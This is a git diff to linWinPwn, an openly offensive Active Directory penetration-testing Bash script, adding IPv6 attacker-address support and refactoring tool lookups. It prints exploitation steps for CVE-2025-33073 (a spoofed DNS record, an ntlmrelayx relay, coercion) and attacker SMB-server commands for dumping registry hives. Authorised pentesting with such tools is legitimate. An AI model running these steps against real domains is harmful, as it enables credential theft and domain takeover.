@@ -21,8 +21,20 @@ pass_wordlist="/usr/share/wordlists/rockyou.txt"
 if ! stat "${pass_wordlist}" >/dev/null 2>&1; then pass_wordlist="${wordlists_dir}/rockyou.txt"; fi
 user_wordlist="/usr/share/seclists/Usernames/cirt-default-usernames.txt"
 if ! stat "${user_wordlist}" >/dev/null 2>&1; then user_wordlist="${wordlists_dir}/cirt-default-usernames.txt"; fi
-attacker_interface="eth0"
-attacker_IP=$(ip -f inet addr show ${attacker_interface} 2>/dev/null | sed -En -e 's/.*inet ([0-9.]+).*/\1/p')
+attacker_interface=$(ip -o -4 route show to default 2>/dev/null | awk '{print $5; exit}')
+if [ -z "${attacker_interface}" ]; then attacker_interface=$(ip -o -6 route show to default 2>/dev/null | awk '{print $5; exit}'); fi
+if [ -z "${attacker_interface}" ]; then attacker_interface="eth0"; fi
+attacker_IPv4=$(ip -f inet addr show "${attacker_interface}" 2>/dev/null | sed -En -e 's/.*inet ([0-9.]+).*/\1/p' | head -1)
+attacker_IPv6=$(ip -o -6 addr show dev "${attacker_interface}" 2>/dev/null | awk '{print $4}' | cut -d/ -f1 | grep -Evi '^(fe80:|::1$)' | head -1)
+attacker_IP="${attacker_IPv4:-$attacker_IPv6}"
+
+is_valid_ip() {
+    local ip="$1"
+    [[ "$ip" =~ ^([0-9]{1,3}\.){3}[0-9]{1,3}$ ]] && return 0
+    [[ "$ip" =~ ^([0-9a-fA-F]{0,4}:){2,7}[0-9a-fA-F]{0,4}$ ]] && return 0
+    return 1
+}
+
 targets="DC"
 ldap_port="389"
 nullsess_bool=false
@@ -44,71 +56,71 @@ offline_bool=false
 
 #Tools variables
 scripts_dir="/opt/lwp-scripts"
-nmap=$(which nmap)
-john=$(which john)
+nmap=$(command -v nmap)
+john=$(command -v john)
 python3="${scripts_dir}/.venv/bin/python3"
-mount=$(which mount)
-if ! stat "${python3}" >/dev/null 2>&1; then python3=$(which python3); fi
-netexec=$(which netexec)
-impacket_findDelegation=$(which findDelegation.py)
-if ! stat "${impacket_findDelegation}" >/dev/null 2>&1; then impacket_findDelegation=$(which impacket-findDelegation); fi
-impacket_GetUserSPNs=$(which GetUserSPNs.py)
-if ! stat "${impacket_GetUserSPNs}" >/dev/null 2>&1; then impacket_GetUserSPNs=$(which impacket-GetUserSPNs); fi
-impacket_secretsdump=$(which secretsdump.py)
-if ! stat "${impacket_secretsdump}" >/dev/null 2>&1; then impacket_secretsdump=$(which impacket-secretsdump); fi
-impacket_GetNPUsers=$(which GetNPUsers.py)
-if ! stat "${impacket_GetNPUsers}" >/dev/null 2>&1; then impacket_GetNPUsers=$(which impacket-GetNPUsers); fi
-impacket_getTGT=$(which getTGT.py)
-if ! stat "${impacket_getTGT}" >/dev/null 2>&1; then impacket_getTGT=$(which impacket-getTGT); fi
-impacket_goldenPac=$(which goldenPac.py)
-if ! stat "${impacket_goldenPac}" >/dev/null 2>&1; then impacket_goldenPac=$(which impacket-goldenPac); fi
-impacket_rpcdump=$(which rpcdump.py)
-if ! stat "${impacket_rpcdump}" >/dev/null 2>&1; then impacket_rpcdump=$(which impacket-rpcdump); fi
-impacket_reg=$(which reg.py)
-if ! stat "${impacket_reg}" >/dev/null 2>&1; then impacket_reg=$(which impacket-reg); fi
-impacket_smbserver=$(which smbserver.py)
-if ! stat "${impacket_smbserver}" >/dev/null 2>&1; then impacket_smbserver=$(which impacket-smbserver); fi
-impacket_ticketer=$(which ticketer.py)
-if ! stat "${impacket_ticketer}" >/dev/null 2>&1; then impacket_ticketer=$(which impacket-ticketer); fi
-impacket_ticketconverter=$(which ticketConverter.py)
-if ! stat "${impacket_ticketconverter}" >/dev/null 2>&1; then impacket_ticketconverter=$(which impacket-ticketconverter); fi
-impacket_getST=$(which getST.py)
-if ! stat "${impacket_getST}" >/dev/null 2>&1; then impacket_getST=$(which impacket-getST); fi
-impacket_raiseChild=$(which raiseChild.py)
-if ! stat "${impacket_raiseChild}" >/dev/null 2>&1; then impacket_raiseChild=$(which impacket-raiseChild); fi
-impacket_smbclient=$(which smbclient.py)
-if ! stat "${impacket_smbclient}" >/dev/null 2>&1; then impacket_smbclient=$(which impacket-smbexec); fi
-impacket_smbexec=$(which smbexec.py)
-if ! stat "${impacket_smbexec}" >/dev/null 2>&1; then impacket_smbexec=$(which impacket-smbexec); fi
-impacket_wmiexec=$(which wmiexec.py)
-if ! stat "${impacket_wmiexec}" >/dev/null 2>&1; then impacket_wmiexec=$(which impacket-wmiexec); fi
-impacket_psexec=$(which psexec.py)
-if ! stat "${impacket_psexec}" >/dev/null 2>&1; then impacket_psexec=$(which impacket-psexec); fi
-impacket_changepasswd=$(which changepasswd.py)
-if ! stat "${impacket_changepasswd}" >/dev/null 2>&1; then impacket_changepasswd=$(which impacket-changepasswd); fi
-impacket_mssqlclient=$(which mssqlclient.py)
-if ! stat "${impacket_mssqlclient}" >/dev/null 2>&1; then impacket_mssqlclient=$(which impacket-mssqlclient); fi
-impacket_describeticket=$(which describeTicket.py)
-if ! stat "${impacket_describeticket}" >/dev/null 2>&1; then impacket_describeticket=$(which impacket-describeTicket); fi
-impacket_badsuccessor=$(which badsuccessor.py)
-if ! stat "${impacket_badsuccessor}" >/dev/null 2>&1; then impacket_badsuccessor=$(which impacket-badsuccessor); fi
-enum4linux_py=$(which enum4linux-ng)
+mount=$(command -v mount)
+if ! stat "${python3}" >/dev/null 2>&1; then python3=$(command -v python3); fi
+netexec=$(command -v netexec)
+impacket_findDelegation=$(command -v findDelegation.py)
+if ! stat "${impacket_findDelegation}" >/dev/null 2>&1; then impacket_findDelegation=$(command -v impacket-findDelegation); fi
+impacket_GetUserSPNs=$(command -v GetUserSPNs.py)
+if ! stat "${impacket_GetUserSPNs}" >/dev/null 2>&1; then impacket_GetUserSPNs=$(command -v impacket-GetUserSPNs); fi
+impacket_secretsdump=$(command -v secretsdump.py)
+if ! stat "${impacket_secretsdump}" >/dev/null 2>&1; then impacket_secretsdump=$(command -v impacket-secretsdump); fi
+impacket_GetNPUsers=$(command -v GetNPUsers.py)
+if ! stat "${impacket_GetNPUsers}" >/dev/null 2>&1; then impacket_GetNPUsers=$(command -v impacket-GetNPUsers); fi
+impacket_getTGT=$(command -v getTGT.py)
+if ! stat "${impacket_getTGT}" >/dev/null 2>&1; then impacket_getTGT=$(command -v impacket-getTGT); fi
+impacket_goldenPac=$(command -v goldenPac.py)
+if ! stat "${impacket_goldenPac}" >/dev/null 2>&1; then impacket_goldenPac=$(command -v impacket-goldenPac); fi
+impacket_rpcdump=$(command -v rpcdump.py)
+if ! stat "${impacket_rpcdump}" >/dev/null 2>&1; then impacket_rpcdump=$(command -v impacket-rpcdump); fi
+impacket_reg=$(command -v reg.py)
+if ! stat "${impacket_reg}" >/dev/null 2>&1; then impacket_reg=$(command -v impacket-reg); fi
+impacket_smbserver=$(command -v smbserver.py)
+if ! stat "${impacket_smbserver}" >/dev/null 2>&1; then impacket_smbserver=$(command -v impacket-smbserver); fi
+impacket_ticketer=$(command -v ticketer.py)
+if ! stat "${impacket_ticketer}" >/dev/null 2>&1; then impacket_ticketer=$(command -v impacket-ticketer); fi
+impacket_ticketconverter=$(command -v ticketConverter.py)
+if ! stat "${impacket_ticketconverter}" >/dev/null 2>&1; then impacket_ticketconverter=$(command -v impacket-ticketconverter); fi
+impacket_getST=$(command -v getST.py)
+if ! stat "${impacket_getST}" >/dev/null 2>&1; then impacket_getST=$(command -v impacket-getST); fi
+impacket_raiseChild=$(command -v raiseChild.py)
+if ! stat "${impacket_raiseChild}" >/dev/null 2>&1; then impacket_raiseChild=$(command -v impacket-raiseChild); fi
+impacket_smbclient=$(command -v smbclient.py)
+if ! stat "${impacket_smbclient}" >/dev/null 2>&1; then impacket_smbclient=$(command -v impacket-smbclient); fi
+impacket_smbexec=$(command -v smbexec.py)
+if ! stat "${impacket_smbexec}" >/dev/null 2>&1; then impacket_smbexec=$(command -v impacket-smbexec); fi
+impacket_wmiexec=$(command -v wmiexec.py)
+if ! stat "${impacket_wmiexec}" >/dev/null 2>&1; then impacket_wmiexec=$(command -v impacket-wmiexec); fi
+impacket_psexec=$(command -v psexec.py)
+if ! stat "${impacket_psexec}" >/dev/null 2>&1; then impacket_psexec=$(command -v impacket-psexec); fi
+impacket_changepasswd=$(command -v changepasswd.py)
+if ! stat "${impacket_changepasswd}" >/dev/null 2>&1; then impacket_changepasswd=$(command -v impacket-changepasswd); fi
+impacket_mssqlclient=$(command -v mssqlclient.py)
+if ! stat "${impacket_mssqlclient}" >/dev/null 2>&1; then impacket_mssqlclient=$(command -v impacket-mssqlclient); fi
+impacket_describeticket=$(command -v describeTicket.py)
+if ! stat "${impacket_describeticket}" >/dev/null 2>&1; then impacket_describeticket=$(command -v impacket-describeTicket); fi
+impacket_badsuccessor=$(command -v badsuccessor.py)
+if ! stat "${impacket_badsuccessor}" >/dev/null 2>&1; then impacket_badsuccessor=$(command -v impacket-badsuccessor); fi
+enum4linux_py=$(command -v enum4linux-ng)
 if ! stat "${enum4linux_py}" >/dev/null 2>&1; then enum4linux_py="$scripts_dir/enum4linux-ng.py"; fi
-bloodhound=$(which bloodhound-python)
-bloodhoundce=$(which bloodhound-ce-python)
-ldapdomaindump=$(which ldapdomaindump)
-smbmap=$(which smbmap)
-certi_py=$(which certi.py)
-certipy=$(which certipy)
-ldeep=$(which ldeep)
-pre2k=$(which pre2k)
-certsync=$(which certsync)
-hekatomb=$(which hekatomb)
-manspider=$(which manspider)
-coercer=$(which coercer)
-donpapi=$(which DonPAPI)
-bloodyad=$(which bloodyAD)
-mssqlrelay=$(which mssqlrelay)
+bloodhound=$(command -v bloodhound-python)
+bloodhoundce=$(command -v bloodhound-ce-python)
+ldapdomaindump=$(command -v ldapdomaindump)
+smbmap=$(command -v smbmap)
+certi_py=$(command -v certi.py)
+certipy=$(command -v certipy)
+ldeep=$(command -v ldeep)
+pre2k=$(command -v pre2k)
+certsync=$(command -v certsync)
+hekatomb=$(command -v hekatomb)
+manspider=$(command -v manspider)
+coercer=$(command -v coercer)
+donpapi=$(command -v DonPAPI)
+bloodyad=$(command -v bloodyAD)
+mssqlrelay=$(command -v mssqlrelay)
 kerbrute="$scripts_dir/kerbrute"
 silenthound="$scripts_dir/silenthound.py"
 windapsearch="$scripts_dir/windapsearch"
@@ -125,37 +137,37 @@ aced="$scripts_dir/aced-main/aced.py"
 sccmhunter="$scripts_dir/sccmhunter-main/sccmhunter.py"
 ldapper="$scripts_dir/ldapper/ldapper.py"
 orpheus="$scripts_dir/orpheus-main/orpheus.py"
-krbjack=$(which krbjack)
+krbjack=$(command -v krbjack)
 adalanche="$scripts_dir/adalanche"
 pygpoabuse="$scripts_dir/pyGPOAbuse-master/pygpoabuse.py"
 GPOwned="$scripts_dir/GPOwned.py"
 privexchange="$scripts_dir/privexchange.py"
 RunFinger="$scripts_dir/Responder/RunFinger.py"
 LDAPNightmare="$scripts_dir/CVE-2024-49113-checker.py"
-ADCheck=$(which adcheck)
-smbclientng=$(which smbclientng)
-evilwinrm=$(which evil-winrm)
+ADCheck=$(command -v adcheck)
+smbclientng=$(command -v smbclientng)
+evilwinrm=$(command -v evil-winrm)
 ldapnomnom="$scripts_dir/ldapnomnom"
 godap="$scripts_dir/godap"
-mssqlpwner=$(which mssqlpwner)
+mssqlpwner=$(command -v mssqlpwner)
 aesKrbKeyGen="$scripts_dir/aesKrbKeyGen.py"
 sccmsecrets="$scripts_dir/SCCMSecrets-master/SCCMSecrets.py"
-soapy=$(which SOAPy)
-soaphound=$(which soaphound)
-gpoParser=$(which gpoParser)
-spearspray=$(which spearspray)
+soapy=$(command -v SOAPy)
+soaphound=$(command -v soaphound)
+gpoParser=$(command -v gpoParser)
+spearspray=$(command -v spearspray)
 GroupPolicyBackdoor="$scripts_dir/GroupPolicyBackdoor-master/gpb.py"
 NetworkHound="$scripts_dir/NetworkHound-main/NetworkHound.py"
-sharehound=$(which sharehound)
-daclsearch=$(which daclsearch)
+sharehound=$(command -v sharehound)
+daclsearch=$(command -v daclsearch)
 ScriptScout="$scripts_dir/scriptscout.py"
 relayking="$scripts_dir/RelayKing-Depth-master/relayking.py"
-adwsdomaindump=$(which adwsdomaindump)
-pyadrecon=$(which pyadrecon)
-pyadrecon_adws=$(which pyadrecon_adws)
+adwsdomaindump=$(command -v adwsdomaindump)
+pyadrecon=$(command -v pyadrecon)
+pyadrecon_adws=$(command -v pyadrecon_adws)
 adpulse="$scripts_dir/ADPulse-main/ADPulse.py"
-powerview_py=$(which powerview)
-evil_winrm_py=$(which evil-winrm-py)
+powerview_py=$(command -v powerview)
+evil_winrm_py=$(command -v evil-winrm-py)
 
 print_banner() {
     echo -e "
@@ -165,7 +177,7 @@ print_banner() {
       | || | | | |\ V  V / | | | | |  __/ \ V  V /| | | | 
       |_||_|_| |_| \_/\_/  |_|_| |_|_|     \_/\_/ |_| |_| 
 
-      ${BLUE}linWinPwn: ${CYAN}version 1.4.8 ${NC}
+      ${BLUE}linWinPwn: ${CYAN}version 1.4.9 ${NC}
       https://github.com/lefayjey/linWinPwn
       ${BLUE}Author: ${CYAN}lefayjey${NC}
       ${BLUE}Inspired by: ${CYAN}S3cur3Th1sSh1t's WinPwn${NC}
@@ -200,7 +212,8 @@ help_linWinPwn() {
     echo -e "--no-exec           Only print commands to be executed, do not run any tools"
     echo -e "--offline           Skip connection and authentication checks"
     echo -e "--verbose           Enable all verbose and debug outputs"
-    echo -e "-I/--interface      Attacker's network interface (default: eth0)"
+    echo -e "-I/--interface      Attacker's network interface (default: auto-detected, fallback: eth0)"
+    echo -e "-a/--attacker-ip    Attacker's IP address (overrides auto-detection; IPv4 or IPv6)"
     echo -e "-T/--targets        Target systems for Vuln Scan, SMB Scan, Network Scan and Pwd Dump (Interactive mode default = DC, Auto mode default = All)"
     echo -e "     ${CYAN}Choose between:${NC} DC (Domain Controllers), All (All domain servers), File='path_to_file' (File containing list of servers), IP='IP_or_hostname' (IP or hostname)"
     echo -e "-U/--userwordlist   Custom username list used during Null session checks"
@@ -271,8 +284,18 @@ while test $# -gt 0; do
         args+=("$1")
         ;; #auto mode, disable interactive
     -I | --interface)
-        attacker_IP="$(ip -f inet addr show "${2}" | sed -En 's/.*inet ([0-9.]+).*/\1/p')"
         attacker_interface="${2}"
+        attacker_IPv4="$(ip -f inet addr show "${2}" 2>/dev/null | sed -En 's/.*inet ([0-9.]+).*/\1/p' | head -1)"
+        attacker_IPv6="$(ip -o -6 addr show dev "${2}" 2>/dev/null | awk '{print $4}' | cut -d/ -f1 | grep -Evi '^(fe80:|::1$)' | head -1)"
+        attacker_IP="${attacker_IPv4:-$attacker_IPv6}"
+        shift
+        ;;
+    -a | --attacker-ip)
+        attacker_IP="${2}"
+        if ! is_valid_ip "$attacker_IP"; then
+            echo -e "${RED}[-] Invalid attacker IP: ${attacker_IP}${NC}" >&2
+            exit 1
+        fi
         shift
         ;;
     -T | --targets)
@@ -411,27 +434,40 @@ ntp_update() {
 }
 
 etc_hosts_update() {
+    local hosts_marker=""
+    local hosts_line=""
     echo -e ""
-    if ! grep -q "${dc_ip}" "/etc/hosts" >/dev/null 2>&1; then
+    if ! awk -v ip="${dc_ip}" -v dom="${dc_domain}" -v fqdn="${dc_FQDN}" -v netbios="${dc_NETBIOS}" '$1==ip && $2==dom && $3==fqdn && $4==netbios {found=1} END {exit found?0:1}' /etc/hosts >/dev/null 2>&1; then
+        hosts_marker="# /etc/hosts entry added by linWinPwn (${dc_FQDN})"
+        hosts_line="${dc_ip}\t${dc_domain} ${dc_FQDN} ${dc_NETBIOS}"
         hosts_bak="${Config_dir}/hosts.$(date +%Y%m%d%H%M%S).backup"
         sudo cp /etc/hosts "${hosts_bak}"
         echo -e "${YELLOW}[i] Backup file of /etc/hosts created: ${hosts_bak}${NC}"
-        sudo sed -i "/${dc_FQDN}/d" /etc/hosts
-        echo -e "# /etc/hosts entry added by linWinPwn" | sudo tee -a /etc/hosts
-        echo -e "${dc_ip}\t${dc_domain} ${dc_FQDN} ${dc_NETBIOS}" | sudo tee -a /etc/hosts
+        echo -e "${hosts_marker}" | sudo tee -a /etc/hosts >/dev/null
+        echo -e "${hosts_line}" | sudo tee -a /etc/hosts >/dev/null
         echo -e "${GREEN}[+] Hosts file update complete${NC}"
     else
-        echo -e "${PURPLE}[-] Target IP already present in /etc/hosts... ${NC}"
+        echo -e "${PURPLE}[-] Target entry already present in /etc/hosts... ${NC}"
     fi
 }
 
 etc_resolv_update() {
+    local resolv_marker=""
+    local resolv_tmp=""
     echo -e ""
-    if ! grep -q "${dns_ip}" "/etc/resolv.conf" >/dev/null 2>&1; then
+    if ! awk -v ns="${dns_ip}" '$1=="nameserver" && $2==ns {found=1} END {exit found?0:1}' /etc/resolv.conf >/dev/null 2>&1; then
+        resolv_marker="# /etc/resolv.conf entry added by linWinPwn (${dns_ip})"
         resolv_bak="${Config_dir}/resolv.conf.$(date +%Y%m%d%H%M%S).backup"
         sudo cp /etc/resolv.conf "${resolv_bak}"
         echo -e "${YELLOW}[i] Backup file of /etc/resolv.conf created: ${resolv_bak}${NC}"
-        sed "1s/^/\# \/etc\/resolv.conf entry added by linWinPwn\nnameserver ${dns_ip}\n/" /etc/resolv.conf | sudo tee /etc/resolv.conf
+        resolv_tmp=$(mktemp)
+        {
+            echo "${resolv_marker}"
+            echo "nameserver ${dns_ip}"
+            cat /etc/resolv.conf
+        } > "${resolv_tmp}"
+        sudo cp "${resolv_tmp}" /etc/resolv.conf
+        rm -f "${resolv_tmp}"
         echo -e "${GREEN}[+] DNS resolv config update complete${NC}"
     else
         echo -e "${PURPLE}[-] DNS IP already present in /etc/resolv.conf... ${NC}"
@@ -498,7 +534,7 @@ prepare() {
         fi
         echo -e "${YELLOW}[i]${NC} Use -h for more help"
         exit 1
-    elif [[ ! $dc_ip =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]]; then
+    elif ! is_valid_ip "$dc_ip"; then
         echo -e "${RED}[-] Target is not an IP address... ${NC}"
         dig_ip=$(dig +short "${dc_ip}")
         if [ -n "$dig_ip" ]; then echo -e "${YELLOW}[i]${NC} Provided target resolves to ${dig_ip}!${NC}"; fi
@@ -627,13 +663,13 @@ prepare() {
         fi
         dc_open_ports=$(/bin/cat "${Scans_dir}/${dc_ip}"_mainports.txt 2>/dev/null)
     fi
-    if [[ $dc_open_ports == *"135/tcp"* ]]; then dc_port_135="${GREEN}open${NC}"; else dc_port_135="${RED}filtered|closed${NC}"; fi
-    if [[ $dc_open_ports == *"445/tcp"* ]]; then dc_port_445="${GREEN}open${NC}"; else dc_port_445="${RED}filtered|closed${NC}"; fi
-    if [[ $dc_open_ports == *"389/tcp"* ]]; then dc_port_389="${GREEN}open${NC}"; else dc_port_389="${RED}filtered|closed${NC}"; fi
-    if [[ $dc_open_ports == *"636/tcp"* ]]; then dc_port_636="${GREEN}open${NC}"; else dc_port_636="${RED}filtered|closed${NC}"; fi
-    if [[ $dc_open_ports == *"88/tcp"* ]]; then dc_port_88="${GREEN}open${NC}"; else dc_port_88="${RED}filtered|closed${NC}"; fi
-    if [[ $dc_open_ports == *"3389/tcp"* ]]; then dc_port_3389="${GREEN}open${NC}"; else dc_port_3389="${RED}filtered|closed${NC}"; fi
-    if [[ $dc_open_ports == *"5985/tcp"* ]]; then dc_port_5985="${GREEN}open${NC}"; else dc_port_5985="${RED}filtered|closed${NC}"; fi
+    for port in 135 445 389 636 88 3389 5985; do
+        if [[ $dc_open_ports == *"${port}/tcp"* ]]; then
+            printf -v "dc_port_${port}" "%b" "${GREEN}open${NC}"
+        else
+            printf -v "dc_port_${port}" "%b" "${RED}filtered|closed${NC}"
+        fi
+    done
 
     if [ "${autoconfig_bool}" == true ]; then
         echo -e "${BLUE}[*] Running auto-config... ${NC}"
@@ -656,60 +692,67 @@ prepare() {
 
     echo -e ""
 
-    if [[ "${targets,,}" == "dc" ]]; then
-        curr_targets="Domain Controllers"
-        curr_targets_sql="SQL servers"
-        curr_targets_list="${target_dc}"
-        curr_targets_list_sql="${target_sql}"
-    elif [[ "${targets,,}" == "all" ]]; then
-        curr_targets="All domain servers"
-        curr_targets_sql="${curr_targets}"
-        curr_targets_list="${target_servers}"
-        curr_targets_list_sql="${target_sql}"
-    elif [[ ${targets,,} == "file="* ]]; then
-        curr_targets="File containing list of servers: "
-        curr_targets_sql="${curr_targets}"
-        custom_servers=$(echo "$targets" | cut -d "=" -f 2)
-        custom_servers_sql=$(echo "$targets" | cut -d "=" -f 2)
-        /bin/cp "${custom_servers}" "${custom_servers_list}" 2>/dev/null
-        if [ ! -s "${custom_servers_list}" ]; then
-            echo -e "${RED}Invalid servers list.${NC} Choosing Domain Controllers as targets instead."
-            curr_targets="Domain Controllers"
-            curr_targets_list="${target_dc}"
-            curr_targets_sql="SQL servers"
+    curr_targets="Domain Controllers"
+    curr_targets_sql="SQL servers"
+    curr_targets_list="${target_dc}"
+    curr_targets_list_sql="${target_sql}"
+    custom_servers=""
+    custom_servers_sql=""
+    custom_ip=""
+    custom_ip_sql=""
+
+    case "${targets,,}" in
+        dc)
+            ;;
+        all)
+            curr_targets="All domain servers"
+            curr_targets_sql="${curr_targets}"
+            curr_targets_list="${target_servers}"
             curr_targets_list_sql="${target_sql}"
-            custom_servers=""
-            custom_servers_sql=""
-        else
-            curr_targets_list="${custom_servers_list}"
-            curr_targets_list_sql="${custom_servers_list}"
-        fi
-    elif [[ ${targets,,} == "ip="* ]]; then
-        curr_targets="IP or hostname: "
-        curr_targets_sql="${curr_targets}"
-        custom_ip=$(echo "$targets" | cut -d "=" -f 2)
-        custom_ip_sql=$(echo "$targets" | cut -d "=" -f 2)
-        echo "$custom_ip" >"${custom_servers_list}" 2>/dev/null
-        if [ ! -s "${custom_servers_list}" ]; then
-            echo -e "${RED}Invalid servers list.${NC} Choosing Domain Controllers as targets instead."
-            curr_targets="Domain Controllers"
-            curr_targets_list="${target_dc}"
-            curr_targets_sql="SQL servers"
-            curr_targets_list_sql="${target_sql}"
-            custom_ip=""
-            custom_ip_sql=""
-        else
-            curr_targets_list="${custom_servers_list}"
-            curr_targets_list_sql="${custom_servers_list}"
-        fi
-    else
-        echo -e "${RED}[-] Error invalid targets parameter.${NC} Choosing default setting: ${YELLOW}Domain Controllers${NC}"
-        echo -e ""
-        curr_targets="Domain Controllers"
-        curr_targets_list="${target_dc}"
-        curr_targets_sql="SQL servers"
-        curr_targets_list_sql="${target_sql}"
-    fi
+            ;;
+        file=*)
+            curr_targets="File containing list of servers: "
+            curr_targets_sql="${curr_targets}"
+            custom_servers=$(echo "$targets" | cut -d "=" -f 2)
+            custom_servers_sql=$(echo "$targets" | cut -d "=" -f 2)
+            /bin/cp "${custom_servers}" "${custom_servers_list}" 2>/dev/null
+            if [ -s "${custom_servers_list}" ]; then
+                curr_targets_list="${custom_servers_list}"
+                curr_targets_list_sql="${custom_servers_list}"
+            else
+                echo -e "${RED}Invalid servers list.${NC} Choosing Domain Controllers as targets instead."
+                curr_targets="Domain Controllers"
+                curr_targets_sql="SQL servers"
+                curr_targets_list="${target_dc}"
+                curr_targets_list_sql="${target_sql}"
+                custom_servers=""
+                custom_servers_sql=""
+            fi
+            ;;
+        ip=*)
+            curr_targets="IP or hostname: "
+            curr_targets_sql="${curr_targets}"
+            custom_ip=$(echo "$targets" | cut -d "=" -f 2)
+            custom_ip_sql=$(echo "$targets" | cut -d "=" -f 2)
+            echo "$custom_ip" >"${custom_servers_list}" 2>/dev/null
+            if [ -s "${custom_servers_list}" ]; then
+                curr_targets_list="${custom_servers_list}"
+                curr_targets_list_sql="${custom_servers_list}"
+            else
+                echo -e "${RED}Invalid servers list.${NC} Choosing Domain Controllers as targets instead."
+                curr_targets="Domain Controllers"
+                curr_targets_sql="SQL servers"
+                curr_targets_list="${target_dc}"
+                curr_targets_list_sql="${target_sql}"
+                custom_ip=""
+                custom_ip_sql=""
+            fi
+            ;;
+        *)
+            echo -e "${RED}[-] Error invalid targets parameter.${NC} Choosing default setting: ${YELLOW}Domain Controllers${NC}"
+            echo -e ""
+            ;;
+    esac
 }
 
 authenticate() {
@@ -3420,12 +3463,14 @@ ms17-010_check() {
 }
 
 coerceplus_check() {
+    local dnsrecord_type_opt=""
     echo -e "${BLUE}[*] coerce check ${NC}"
     run_command "${netexec} ${ne_verbose} smb ${curr_targets_list} ${argument_ne} -M coerce_plus --log ${Vulnerabilities_dir}/ne_coerce_output_${dc_domain}.txt" 2>&1
     if grep -q "VULNERABLE" "${Vulnerabilities_dir}/ne_coerce_output_${dc_domain}.txt"; then
+        if [[ "${attacker_IP}" == *:* ]]; then dnsrecord_type_opt="--dnstype AAAA"; fi
         echo -e "${GREEN}[+] Target(s) vulnerable to coercing found! Consider checking for CVE-2025-33073 (https://github.com/mverschu/CVE-2025-33073). Follow steps below for exploitation:${NC}" | tee -a "${Vulnerabilities_dir}/CVE_2025_33073_exploitation_steps_${dc_domain}.txt"
         echo -e "${CYAN}1. Add DNS record pointing to the attacker machine:${NC}" | tee -a "${Vulnerabilities_dir}/CVE_2025_33073_exploitation_steps_${dc_domain}.txt"
-        echo -e "${bloodyad} ${argument_bloodyad} --host ${dc_FQDN} --dc-ip ${dc_ip} --dns ${dns_ip} add dnsRecord localhost1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA ${attacker_IP}" | tee -a "${Vulnerabilities_dir}/CVE_2025_33073_exploitation_steps_${dc_domain}.txt"
+        echo -e "${bloodyad} ${argument_bloodyad} --host ${dc_FQDN} --dc-ip ${dc_ip} --dns ${dns_ip} add dnsRecord ${dnsrecord_type_opt} localhost1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA ${attacker_IP}" | tee -a "${Vulnerabilities_dir}/CVE_2025_33073_exploitation_steps_${dc_domain}.txt"
         echo -e "${CYAN}2. Use ntlmrelayx to run a listener and execute secretdump:${NC}" | tee -a "${Vulnerabilities_dir}/CVE_2025_33073_exploitation_steps_${dc_domain}.txt"
         echo -e "ntlmrelayx.py -t smb://[ TARGET ] -smb2support" | tee -a "${Vulnerabilities_dir}/CVE_2025_33073_exploitation_steps_${dc_domain}.txt"
         echo -e "${CYAN}3. Coerce the target machine to connect back to your attacker machine:${NC}" | tee -a "${Vulnerabilities_dir}/CVE_2025_33073_exploitation_steps_${dc_domain}.txt"
@@ -3928,6 +3973,7 @@ add_computer_ou() {
 }
 
 dnsentry_add() {
+    local dnsrecord_type_opt=""
     if ! stat "${bloodyad}" >/dev/null 2>&1; then
         echo -e "${RED}[-] Please verify the installation of bloodyad${NC}"
     else
@@ -3942,8 +3988,9 @@ dnsentry_add() {
             if [ "${hostname_dnstool}" == "" ]; then hostname_dnstool="kali"; fi
             echo -e "${BLUE}[*] Please confirm the IP of the attacker's machine:${NC}"
             set_attackerIP
+            if [[ "${attacker_IP}" == *:* ]]; then dnsrecord_type_opt="--dnstype AAAA"; fi
             echo -e "${BLUE}[*] Adding new DNS entry ${hostname_dnstool} with IP ${attacker_IP} for Active Directory integrated DNS${NC}"
-            run_command "${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_FQDN} --dc-ip ${dc_ip} --dns ${dns_ip} add dnsRecord '${hostname_dnstool}' '${attacker_IP}'" | tee -a "${Modification_dir}//bloodyAD_${user_var}/bloodyad_dns_add_${dc_domain}.txt"
+            run_command "${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_FQDN} --dc-ip ${dc_ip} --dns ${dns_ip} add dnsRecord ${dnsrecord_type_opt} '${hostname_dnstool}' '${attacker_IP}'" | tee -a "${Modification_dir}//bloodyAD_${user_var}/bloodyad_dns_add_${dc_domain}.txt"
         fi
     fi
     echo -e ""
@@ -4732,7 +4779,7 @@ samsystem_dump() {
         else
             set_attackerIP
             echo -e "${YELLOW}[*] Run an SMB server using the following command and then press ENTER to continue....${NC}"
-            echo -e "${impacket_smbserver} -ip ${attacker_IP} -smb2support lwpshare ${Credentials_dir}/"
+            echo -e "${impacket_smbserver} -ip ${attacker_IP} [-6] -smb2support lwpshare ${Credentials_dir}/"
             read -rp "" </dev/tty
             for i in $(/bin/cat "${curr_targets_list}"); do
                 echo -e "${CYAN}[*] reg save of ${i} ${NC}"
@@ -5464,22 +5511,34 @@ modify_target_sql() {
 
 
 set_attackerIP() {
-    echo -e "Please choose the attacker's IP. List of current machine's IPs:"
-    attacker_IPlist=($(/usr/bin/hostname -I))
-    for ip in "${attacker_IPlist[@]}"; do
+    local ip
+    echo -e "Please choose the attacker's IP (IPv4 or IPv6)."
+    echo -e "${CYAN}[*] IPv4 addresses:${NC}"
+    for ip in $(ip -o -4 addr show scope global | awk '{print $4}' | cut -d/ -f1); do
         echo -e "${YELLOW}${ip}${NC}"
     done
-    attacker_IP=""
-    read -rp ">> " attacker_IP </dev/tty
+    echo -e "${CYAN}[*] IPv6 addresses:${NC}"
+    for ip in $(ip -o -6 addr show | awk '{print $4}' | cut -d/ -f1 | grep -vi '^::1$' | awk '!seen[$0]++'); do
+        echo -e "${YELLOW}${ip}${NC}"
+    done
 
-    while [[ -z "${attacker_IP}" ]]; do
+    while true; do
+        read -rp ">> " attacker_IP </dev/tty
         if [[ -z "${attacker_IP}" ]]; then
             echo -e "${RED}Empty input.${NC}"
+            echo -e "${RED}Invalid IP.${NC} Please specify a valid IPv4 or IPv6 address."
+            continue
         fi
-        if [[ -z "${attacker_IP}" ]]; then
-            echo -e "${RED}Invalid IP.${NC} Please specify your attacker's IP."
-            read -rp ">> " attacker_IP </dev/tty
+
+        # Allow pasted URI-style IPv6 values like [2001:db8::1].
+        attacker_IP="${attacker_IP#[}"
+        attacker_IP="${attacker_IP%]}"
+
